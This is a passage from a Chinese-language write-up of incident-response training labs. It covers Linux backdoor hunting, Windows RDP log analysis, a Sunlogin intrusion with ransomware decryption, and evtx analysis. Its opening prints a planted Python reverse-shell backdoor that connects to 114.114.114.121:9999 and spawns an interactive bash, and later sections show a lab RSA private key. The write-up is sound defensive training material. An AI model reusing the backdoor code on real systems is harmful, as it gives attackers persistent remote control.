</span></span><span style=display:flex><span>        sys.exit<span style=color:#f92672>(</span>0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>os.chdir<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/&#34;</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>os.setsid<span style=color:#f92672>()</span>
</span></span><span style=display:flex><span>os.umask<span style=color:#f92672>(</span>0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>drgpid <span style=color:#f92672>=</span> os.fork<span style=color:#f92672>()</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> drgpid &gt; 0:
</span></span><span style=display:flex><span>        sys.exit<span style=color:#f92672>(</span>0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> 1:
</span></span><span style=display:flex><span>        try:
</span></span><span style=display:flex><span>                sys.stdout.flush<span style=color:#f92672>()</span>
</span></span><span style=display:flex><span>                sys.stderr.flush<span style=color:#f92672>()</span>
</span></span><span style=display:flex><span>                fdreg <span style=color:#f92672>=</span> open<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/dev/null&#34;</span>, <span style=color:#e6db74>&#34;w&#34;</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>                sys.stdout <span style=color:#f92672>=</span> fdreg
</span></span><span style=display:flex><span>                sys.stderr <span style=color:#f92672>=</span> fdreg
</span></span><span style=display:flex><span>                sdregs<span style=color:#f92672>=</span>socket.socket<span style=color:#f92672>(</span>socket.AF_INET,socket.SOCK_STREAM<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>                sdregs.connect<span style=color:#f92672>((</span><span style=color:#e6db74>&#34;114.114.114.121&#34;</span>,9999<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>                os.dup2<span style=color:#f92672>(</span>sdregs.fileno<span style=color:#f92672>()</span>,0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>                os.dup2<span style=color:#f92672>(</span>sdregs.fileno<span style=color:#f92672>()</span>,1<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>                os.dup2<span style=color:#f92672>(</span>sdregs.fileno<span style=color:#f92672>()</span>,2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>                p<span style=color:#f92672>=</span>subprocess.call<span style=color:#f92672>([</span><span style=color:#e6db74>&#34;/bin/bash&#34;</span>,<span style=color:#e6db74>&#34;-i&#34;</span><span style=color:#f92672>])</span>
</span></span><span style=display:flex><span>                sdregs.close<span style=color:#f92672>()</span>
</span></span><span style=display:flex><span>        except Exception:
</span></span><span style=display:flex><span>                pass
</span></span><span style=display:flex><span>        time.sleep<span style=color:#f92672>(</span>2<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>是弹shell(为什么不是shell.py呢)</p><pre tabindex=0><code>flag{109CCB5768C70638E24FB46EE7957E37}
</code></pre><h2 id=q2-6>Q2</h2><p>参考上面的内容</p><pre tabindex=0><code>flag{114.114.114.121:9999}
</code></pre><h2 id=q3-6>Q3</h2><p>查找所有具有 SUID 权限的可执行文件，并列出它们的详细信息</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@xuanji:~# find / -perm -4000 -type f -exec ls -la <span style=color:#f92672>{}</span> 2&gt;/dev/null <span style=color:#ae81ff>\;</span>
</span></span><span style=display:flex><span>-rwsr-xr-x. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>94792</span> Nov <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2016</span> /bin/mount
</span></span><span style=display:flex><span>-rwsr-xr-x. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>44168</span> May  <span style=color:#ae81ff>7</span>  <span style=color:#ae81ff>2014</span> /bin/ping
</span></span><span style=display:flex><span>-rwsr-xr-x. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>44680</span> May  <span style=color:#ae81ff>7</span>  <span style=color:#ae81ff>2014</span> /bin/ping6
</span></span><span style=display:flex><span>-rwsr-xr-x. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>36936</span> May <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2017</span> /bin/su
</span></span><span style=display:flex><span>-rwsr-xr-x. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>69120</span> Nov <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2016</span> /bin/umount
</span></span><span style=display:flex><span>-rwsr-xr-x. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>46424</span> May <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2017</span> /usr/bin/chfn
</span></span><span style=display:flex><span>-rwsr-xr-x. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>41336</span> May <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2017</span> /usr/bin/chsh
</span></span><span style=display:flex><span>-rwsr-xr-x. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>229992</span> Jan  <span style=color:#ae81ff>6</span>  <span style=color:#ae81ff>2014</span> /usr/bin/find
</span></span><span style=display:flex><span>-rwsr-xr-x. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>72280</span> May <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2017</span> /usr/bin/gpasswd
</span></span><span style=display:flex><span>-rwsr-xr-x. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>36592</span> May <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2017</span> /usr/bin/newgrp
</span></span><span style=display:flex><span>-rwsr-xr-x. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>47032</span> May <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2017</span> /usr/bin/passwd
</span></span><span style=display:flex><span>-rwsr-xr-x. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>155008</span> May <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2017</span> /usr/bin/sudo
</span></span><span style=display:flex><span>-rwsr-xr-x. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>10240</span> Mar <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2017</span> /usr/lib/eject/dmcrypt-get-device
</span></span><span style=display:flex><span>-rwsr-xr-x. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>440416</span> Mar  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2019</span> /usr/lib/openssh/ssh-keysign
</span></span></code></pre></div><pre tabindex=0><code>flag{7FD5884F493F4AAF96ABEE286EE04120}
/usr/bin/find
</code></pre><h2 id=q4-6>Q4</h2><p><code>opt</code>通常用于通常用于安装<strong>第三方软件</strong>或<strong>自定义程序</strong>，不是系统默认二进制文件的位置。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@xuanji:~# cd /opt
</span></span><span style=display:flex><span>root@xuanji:/opt# ls
</span></span><span style=display:flex><span>root@xuanji:/opt# ls /
</span></span><span style=display:flex><span>1.log  bin  boot  core  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  supervisord.log  supervisord.pid  sys  tmp  usr  var
</span></span><span style=display:flex><span>root@xuanji:/opt# ls -al
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>16</span>
</span></span><span style=display:flex><span>drwxr-xr-x. <span style=color:#ae81ff>1</span> root root    <span style=color:#ae81ff>30</span> Aug  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2023</span> .
</span></span><span style=display:flex><span>drwxr-xr-x. <span style=color:#ae81ff>1</span> root root    <span style=color:#ae81ff>85</span> Mar  <span style=color:#ae81ff>4</span> 14:11 ..
</span></span><span style=display:flex><span>drwxr-xr-x. <span style=color:#ae81ff>3</span> ctf  <span style=color:#ae81ff>1000</span> <span style=color:#ae81ff>16384</span> Aug  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2023</span> .cymothoa-1-beta
</span></span><span style=display:flex><span>root@xuanji:/opt# cd .cymothoa-1-beta
</span></span><span style=display:flex><span>root@xuanji:/opt/.cymothoa-1-beta# ls
</span></span><span style=display:flex><span>Makefile  bgrep.c  cymothoa    cymothoa.h             payloads    personalization.h  syscalls.txt  udp_server.c
</span></span><span style=display:flex><span>bgrep     core     cymothoa.c  hexdump_to_cstring.pl  payloads.h  syscall_code.pl    udp_server
</span></span></code></pre></div><pre tabindex=0><code>/opt/.cymothoa-1-beta/cymothoa
flag{087C267368ECE4FCF422FF733B51AED9}
</code></pre><h2 id=q5-4>Q5</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 /tmp/.temp/libprocesshider/1.py
</span></span><span style=display:flex><span>root@xuanji:~# which python3
</span></span><span style=display:flex><span>/usr/bin/python3
</span></span><span style=display:flex><span>root@xuanji:~# ls -la /usr/bin/python3
</span></span><span style=display:flex><span>lrwxrwxrwx. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>9</span> Mar <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2014</span> /usr/bin/python3 -&gt; python3.4
</span></span></code></pre></div><pre tabindex=0><code>flag{/usr/bin/python3.4}
</code></pre><h1 id=第四章-windows实战-日志分析>第四章 windows实战-日志分析</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>题目描述：
</span></span><span style=display:flex><span>  某台Windows服务器遭到攻击者入侵，管理员查看发现存在大量rdp爆破的请求，攻击者使用了不同位置的IP(此处模拟)，进行爆破并成功，并成功进入了系统，进入系统后又做了其它危害性操作，请根据各题目完成填写
</span></span></code></pre></div><h2 id=q1-7>Q1</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>审计桌面的logs日志，定位所有扫描IP，并提交扫描次数
</span></span></code></pre></div><p>登录之后将log移动到本地</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└─$ cat access.log | awk <span style=color:#e6db74>&#39;{print $1}&#39;</span> | sort | uniq -c | sort -nr
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>6331</span> 192.168.150.67
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>524</span> 192.168.150.1
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>169</span> 127.0.0.1
</span></span><span style=display:flex><span>     <span style=color:#ae81ff>54</span> 192.168.150.33
</span></span><span style=display:flex><span>      <span style=color:#ae81ff>1</span> 192.168.150.60
</span></span></code></pre></div><p>首先排除<code>127.0.0.1</code>去log里面简单进行排查一下</p><p>分析后发现</p><pre tabindex=0><code>6331 192.168.150.67
54 192.168.150.33
</code></pre><pre tabindex=0><code>flag{6385}
</code></pre><h2 id=q2-7>Q2</h2><pre tabindex=0><code>审计相关日志，提交rdp被爆破失败次数
</code></pre><p>RDP 登录失败通常会记录在 Windows 安全日志中，特别是 <strong>事件ID 4625</strong>（失败的登录事件）</p><p><img alt=2025-03-05194159 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-05194159.png></p><p>flag{2594}</p><h2 id=q3-7>Q3</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>审计相关日志，提交成功登录rdp的远程IP地址，多个以&amp;连接,以从小到大顺序排序提交
</span></span></code></pre></div><p>RDP 成功登录事件的 <strong>事件ID 4624</strong> 表示成功的登录事件(慢慢手查，太卡了)</p><p><strong>FullEventLogView 是一款由 NirSoft 开发的轻量级工具，用于查看和导出 Windows 事件日志的详细信息。它提供了一个直观的界面，方便用户浏览 Windows 系统中的所有事件日志，并支持多种过滤和排序功能。</strong></p><pre tabindex=0><code>192.168.150.1
192.168.150.178
192.168.150.128
</code></pre><p>还有的就是本地和127的连接可以排除</p><pre tabindex=0><code>flag{192.168.150.1&amp;192.168.150.128&amp;192.168.150.178}
</code></pre><h2 id=q4-7>Q4</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>提交黑客创建的隐藏账号
</span></span></code></pre></div><p>Windows 系统会在安全日志中记录账户创建的事件。需要关注事件 <strong>ID 4720</strong>（账户创建事件）</p><p><img alt=2025-03-05195709 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-05195709.png></p><pre tabindex=0><code>hacker$
</code></pre><h2 id=q5-5>Q5</h2><pre tabindex=0><code>提交黑客创建的影子账号
</code></pre><pre tabindex=0><code>hackers$
</code></pre><p>我的建议就是手查，一共就这几个用户</p><h2 id=q6>Q6</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>提交远程shell程序的连接IP+端口，以IP:port方式提交
</span></span></code></pre></div><p>尝试直接进行了<strong>netstat -ano</strong>,但是没有显示ip</p><p><img alt=2025-03-05200028 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-05200028.png></p><p>看了wp去看了任务计划程序，然后看到有一个定时任务，下载了一个xiaowei.exe拖到桌面分析一下</p><p><a href=https://www.virustotal.com/gui/file/2a357e65570114333a1a4bc21eb45d048520f93aab45546a08dd5b917ac33585/behavior>VirusTotal - 文件</a></p><p><img alt=2025-03-05200628 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-05200628.png></p><pre tabindex=0><code>flag{185.117.118.21:4444}
</code></pre><h2 id=q7>Q7</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>黑客植入了一个远程shell，审计相关进程和自启动项提交该程序名字
</span></span></code></pre></div><pre tabindex=0><code>xiaowei.exe
</code></pre><h2 id=q8>Q8</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>黑客使用了计划任务来定时执行某shell程序，提交此程序名字
</span></span></code></pre></div><p><img alt=2025-03-05200840 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-05200840.png></p><pre tabindex=0><code>flag{download.bat}
</code></pre><h1 id=第四章-windows实战-向日葵>第四章 windows实战-向日葵</h1><h2 id=q1-8>Q1</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>通过本地 PC RDP到服务器并且找到黑客首次攻击成功的时间为 为多少,将黑客首次攻击成功的时间为 作为 FLAG 提交(2028-03-26 08:11:25.123);
</span></span></code></pre></div><p>桌面有向日葵，找到源文件位置，看log最大的哪个，先写出的是ip，也就是q2，q1可以看出执行了whoami说明连接成功了</p><p><img alt=2025-03-10191905 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-10191905.png></p><pre tabindex=0><code>2024-03-26 10:16:25.585
</code></pre><h2 id=q2-8>Q2</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>通过本地 PC RDP到服务器并且找到黑客攻击的 IP 为多少,将黑客攻击 IP 作为 FLAG 提交;
</span></span></code></pre></div><p><img alt=2025-03-10191733 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-10191733.png></p><pre tabindex=0><code>192.168.31.45
</code></pre><h2 id=q3-8>Q3</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>通过本地 PC RDP到服务器并且找到黑客托管恶意程序 IP 为,将黑客托管恶意程序 IP 作为 FLAG 提交;
</span></span></code></pre></div><p>看进行的命令执行，ping了后面的内容，有指定的ip</p><p><img alt=2025-03-10192422 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-10192422.png></p><pre tabindex=0><code>192.168.31.249
</code></pre><h2 id=q4-8>Q4</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>找到黑客解密 DEC 文件,将黑客DEC 文件的 md5 作为 FLAG 提交;
</span></span></code></pre></div><p>先直接搜索DEC文件，发现没有内容，再搜一下txt文件，发现有个qq文件，给了qq号，在玄机一群里面有文件，下载下来</p><p><img alt=2025-03-10192606 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-10192606.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>orange㉿Coyano<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>/mnt/d/Tencent/TIM/file<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─$ md5sum DEC*
</span></span><span style=display:flex><span>5ad8d202f80202f6d31e077fc9b0fc6b  DEC.pem
</span></span></code></pre></div><h2 id=q5-6>Q5</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>通过本地 PC RDP到服务器并且解密黑客勒索软件,将桌面加密文件中关键信息作为 FLAG 提交;
</span></span></code></pre></div><p>DEC给了私钥尝试解密</p><pre tabindex=0><code>N2xTZ2Bsn2Y5lve7KZ36bgsFjqncBs55VO0zkeEIr5Iga/kbegA0BAstotBWnZ16+trNfkzl3apUobodMkC8covEo22p+kWAyVjMRyJ98EQ4Pspr/Y5HIuH0xuvPa82j7b0AMJHkyd2viuymI/mrxjJk2X0xlEE4YVioMLd22+w=

Your files have been encrypted

0sWK8adKSGh1Xaxo6n1mZFoyNDYVokXwkBhxnzxU+MEJIV44u48SdOiFzWLn849hObaP6z26lLtMnXaDUnAPuMh+nF2hw9RoAsur7KYxE8/iY/y4jOEBsHT5wvQldcNfntrDyMUCvrWTUHl2yapUmaIIf2rZsNsqMVJ9puZzp58+FJmulyC7R1C2yoP1jHhsdOkU7htbzUWWsm2ybL+eVpXTFC+i6nuEBoAYhv2kjSgL8qKBFsLKmKQSn/ILRPaRYDFP/srEQzF7Y4yZa4cotpFTdGUVU547Eib/EaNuhTyzgOGKjXl2UYxHM/v0c3lgjO7GDA9eF3a/BBXPAgtK126lUfoGK7iSAhduRt5sRP4=
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> cryptography.hazmat.primitives <span style=color:#f92672>import</span> serialization, hashes
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> cryptography.hazmat.primitives.asymmetric <span style=color:#f92672>import</span> padding
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> cryptography.hazmat.backends <span style=color:#f92672>import</span> default_backend
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 加载 RSA 私钥</span>
</span></span><span style=display:flex><span>private_key_pem <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>-----BEGIN RSA PRIVATE KEY-----
</span></span></span><span style=display:flex><span><span style=color:#e6db74>MIICXQIBAAKBgQDWQqpkHRKtRu66MjTrNZC13A6rIlGaJBd/FYBy4ifiITasCnQE
</span></span></span><span style=display:flex><span><span style=color:#e6db74>J9aRTIYQsM5iincecnvY8xGYMg5pVTp6P4fxS4/+1bAEciRXSTCmLI8FeDd3sjOc
</span></span></span><span style=display:flex><span><span style=color:#e6db74>HTw82sG0hfnnb0b/LFhbOCk7BgLnpwvSy5za/dtVQFSDbQbQuTBp029AKwIDAQAB
</span></span></span><span style=display:flex><span><span style=color:#e6db74>AoGBAKh6952NtvgGhQZpIG+sSUSX6/jqHZzFsKw/7idoatBIKcOS3LO/19udfvZ0
</span></span></span><span style=display:flex><span><span style=color:#e6db74>8XVPSGfqwjRQvo8dHXP6juc+Odg1XOLPw4fjjJz9b9dLKCKwtIU3CwA1AmuhYNGp
</span></span></span><span style=display:flex><span><span style=color:#e6db74>1OXlHLyUaNVTN3TZN9Dn7txD4gOvLIirqbmhzy/N7PdPF5ThAkEA4MB++5DSY7Kv
</span></span></span><span style=display:flex><span><span style=color:#e6db74>MO1uHuxTr/jRy6754Mzgo0fpLBXSB13/nLMxRA6QEbigoAFpsFd36EYMKzftbezB
</span></span></span><span style=display:flex><span><span style=color:#e6db74>gx2nphvLUwJBAPQMv730MqCWjaCPLgYRV+oMU6OnOMs6+ALql+I1eVqVfBAt+5De
</span></span></span><span style=display:flex><span><span style=color:#e6db74>HMxY7mWdaR9pofzuz+6KkmwRHqKSVw45dMkCQFJ68l76B+vkoFxxVe9tRU0YIE4C
</span></span></span><span style=display:flex><span><span style=color:#e6db74>mdtA9NOXSWAPZfOkMHFeZZ8XRRHr0q7FtfasMuoAAuk9bhngQCgREvxnyNcCQGnt
</span></span></span><span style=display:flex><span><span style=color:#e6db74>trQecHMfpe2Q+CsOEBi4rP0VsiMUP14UsUQwbbIRvD3Rl6WzotBXsXJNtrk5wmPk
</span></span></span><span style=display:flex><span><span style=color:#e6db74>zD//ybo6XA+4cSztZ3ECQQC92ck1XJm7V12SOFqHcNXFoS8tFvgNQXNEahmhJ2wb
</span></span></span><span style=display:flex><span><span style=color:#e6db74>xTo0VwUhCeG1n8X5PqRn6Rcsh8YQAt924YrWtcTxrg8g
</span></span></span><span style=display:flex><span><span style=color:#e6db74>-----END RSA PRIVATE KEY-----
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>private_key <span style=color:#f92672>=</span> serialization<span style=color:#f92672>.</span>load_pem_private_key(
</span></span><span style=display:flex><span>    private_key_pem<span style=color:#f92672>.</span>encode(),
</span></span><span style=display:flex><span>    password<span style=color:#f92672>=</span><span style=color:#66d9ef>None</span>,
</span></span><span style=display:flex><span>    backend<span style=color:#f92672>=</span>default_backend()
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 加密数据（Base64 解码）</span>
</span></span><span style=display:flex><span>encrypted_data <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64decode(<span style=color:#e6db74>&#34;N2xTZ2Bsn2Y5lve7KZ36bgsFjqncBs55VO0zkeEIr5Iga/kbegA0BAstotBWnZ16+trNfkzl3apUobodMkC8covEo22p+kWAyVjMRyJ98EQ4Pspr/Y5HIuH0xuvPa82j7b0AMJHkyd2viuymI/mrxjJk2X0xlEE4YVioMLd22+w=&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 打印加密数据的长度</span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;Length of encrypted data:&#34;</span>, len(encrypted_data))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 尝试使用 PKCS1_OAEP 填充模式</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>    decrypted_data <span style=color:#f92672>=</span> private_key<span style=color:#f92672>.</span>decrypt(
</span></span><span style=display:flex><span>        encrypted_data,
</span></span><span style=display:flex><span>        padding<span style=color:#f92672>.</span>OAEP(
</span></span><span style=display:flex><span>            mgf<span style=color:#f92672>=</span>padding<span style=color:#f92672>.</span>MGF1(algorithm<span style=color:#f92672>=</span>hashes<span style=color:#f92672>.</span>SHA256()),
</span></span><span style=display:flex><span>            algorithm<span style=color:#f92672>=</span>hashes<span style=color:#f92672>.</span>SHA256(),
</span></span><span style=display:flex><span>            label<span style=color:#f92672>=</span><span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>        )
</span></span><span style=display:flex><span>    )
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Decrypted data (OAEP):&#34;</span>, decrypted_data<span style=color:#f92672>.</span>decode())
</span></span><span style=display:flex><span><span style=color:#66d9ef>except</span> <span style=color:#a6e22e>ValueError</span>:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Decryption with OAEP failed. Trying PKCS1_v1_5...&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 尝试使用 PKCS1_v1_5 填充模式</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        decrypted_data <span style=color:#f92672>=</span> private_key<span style=color:#f92672>.</span>decrypt(
</span></span><span style=display:flex><span>            encrypted_data,
</span></span><span style=display:flex><span>            padding<span style=color:#f92672>.</span>PKCS1v15()
</span></span><span style=display:flex><span>        )
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Decrypted data (PKCS1_v1_5):&#34;</span>, decrypted_data<span style=color:#f92672>.</span>decode())
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>ValueError</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Decryption with PKCS1_v1_5 also failed.&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#75715e># NXVJSTQUAPGTXKSX</span>
</span></span></code></pre></div><p>得到钥匙之后再进行AES的解密</p><p><img alt=2025-03-10194051 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-10194051.png></p><h1 id=第五章-windows-实战-evtx-文件分析>第五章 Windows 实战-evtx 文件分析</h1><h2 id=q1-9>Q1</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>1.将黑客成功登录系统所使用的IP地址作为Flag值提交；
</span></span></code></pre></div><p>搜索事件<code>4624</code>一个个翻</p><p><img alt=2025-03-09121606 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09121606.png></p><h2 id=q2-9>Q2</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>2.黑客成功登录系统后修改了登录用户的用户名，将修改后的用户名作为Flag值提交；
</span></span></code></pre></div><ul><li><strong>事件ID 4722</strong>: 用户账户被修改。这个事件通常记录了用户账户属性的更改，包括用户名的修改。</li><li><strong>事件ID 4738</strong>: 用户账户被修改。这个事件通常用于记录用户账户属性的更改，包括用户名的修改。</li></ul><p><img alt=2025-03-09122112 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09122112.png></p><pre tabindex=0><code>flag{Adnimistartro}
</code></pre><h2 id=q3-9>Q3</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>3.黑客成功登录系统后成功访问了一个关键位置的文件，将该文件名称（文件名称不包含后缀）作为Flag值提交；
</span></span></code></pre></div><ul><li><p><strong>事件ID 4663</strong>：尝试访问文件或目录。</p><ul><li><p>该事件会记录哪个用户访问了哪个文件或目录。</p></li><li><p>需<img alt=2025-03-09122112 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09122112.png>要启用<strong>对象访问审计</strong>（Object Access Auditing)才能记录此事件。</p></li></ul></li></ul><pre tabindex=0><code>flag{SCHEMA}
</code></pre><h2 id=q4-9>Q4</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>4.黑客成功登录系统后重启过几次数据库服务，将最后一次重启数据库服务后数据库服务的进程ID号作为Flag值提交；
